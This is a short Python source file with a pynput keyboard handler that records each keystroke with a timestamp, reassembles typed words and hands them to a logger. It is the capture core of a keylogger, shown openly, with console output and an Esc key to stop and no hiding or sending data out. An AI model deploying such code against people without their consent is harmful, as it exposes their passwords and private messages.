import datetime
from pynput import keyboard

class KeyHandler:

    def __init__(self, logger):

        self.logger = logger
        self.current_word = ""
        self.key_count = 0

    def on_press(self, key):

        current_time = datetime.datetime.now().strftime("%H:%M:%S")

        try:

            char = key.char
            entry = f"[{current_time}] {char}\n"

            self.key_count += 1
            self.current_word += char

            print(f"[{current_time}] {char}")

        except AttributeError:

            entry = f"[{current_time}] {key}\n"

            if key == keyboard.Key.space:

                self.logger.add(
                    f"[{current_time}] [WORD] {self.current_word}\n"
                )

                self.current_word = ""

            if key == keyboard.Key.esc:
                return False

        self.logger.add(entry)

        return True